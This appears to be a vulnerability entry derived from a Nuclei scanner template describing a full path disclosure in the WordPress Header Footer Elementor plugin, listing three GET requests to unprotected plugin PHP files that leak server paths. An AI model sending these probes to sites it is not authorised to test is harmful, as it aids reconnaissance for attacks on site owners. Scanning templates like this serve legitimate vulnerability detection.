# Vulnerability: WordPress Header Footer Elementor - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-header-footer-elementor-fpd.yaml`)

## Description
WordPress Header Footer Elementor plugin (also known as Ultimate Addons for Elementor - Lite) contains PHP files that lack proper ABSPATH protection, allowing direct access that reveals sensitive server path information via PHP error messages.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/header-footer-elementor/inc/widgets-manager/widgets/navigation-menu/navigation-menu.php
GET {{BaseURL}}/wp-content/plugins/header-footer-elementor/inc/widgets-manager/widgets/copyright/copyright.php
GET {{BaseURL}}/wp-content/plugins/header-footer-elementor/inc/widgets-manager/class-widgets-loader.php
```

